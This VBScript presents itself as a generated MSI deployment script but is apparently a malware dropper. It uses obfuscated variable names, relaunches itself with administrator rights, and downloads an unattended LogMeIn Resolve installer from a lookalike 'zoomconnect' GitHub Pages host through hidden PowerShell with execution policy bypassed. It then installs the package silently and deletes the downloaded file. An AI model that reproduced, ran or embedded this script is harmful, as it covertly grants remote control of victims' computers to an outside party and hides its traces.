' Generated Deployment Script – MSI
' URL: https://zoomconnect.github.io/Zooom/LogMeInResolve_Unattended1.msi
Option Explicit

Dim pcbDtHJz, KOxqN, EvuDg, Brwfim, KXuFJ

Set pcbDtHJz = CreateObject("WScript.Shell")
Set KOxqN = CreateObject("Scripting.FileSystemObject")

' Request elevation if not already running as administrator
If Not WScript.Arguments.Named.Exists("elevate") Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName, _
        """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
    WScript.Quit
End If

' Resolve %TEMP% and build the full installer path
EvuDg = pcbDtHJz.ExpandEnvironmentStrings("%TEMP%")
Brwfim = EvuDg & "\" & "installer049.msi"

' Download the installer via PowerShell (window hidden, wait for completion)
KXuFJ = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & Chr(34) & "(New-Object Net.WebClient).DownloadFile(" & Chr(39) & "https://zoomconnect.github.io/Zooom/LogMeInResolve_Unattended1.msi" & Chr(39) & "," & Chr(39) & Brwfim & Chr(39) & ")" & Chr(34)
pcbDtHJz.Run KXuFJ, 0, True

' Verify the download succeeded — abort if file is missing or empty
If Not KOxqN.FileExists(Brwfim) Then WScript.Quit 1
If KOxqN.GetFile(Brwfim).Size = 0 Then
    On Error Resume Next
    KOxqN.DeleteFile Brwfim
    On Error GoTo 0
    WScript.Quit 1
End If

' Run the installer silently

KXuFJ = "msiexec /i " & Chr(34) & Brwfim & Chr(34) & " /qn /norestart"
pcbDtHJz.Run KXuFJ, 0, True

' Allow any spawned child processes to finish, then clean up the temp file
WScript.Sleep 6000
On Error Resume Next
KOxqN.DeleteFile Brwfim
On Error GoTo 0

Set pcbDtHJz = Nothing
Set KOxqN = Nothing
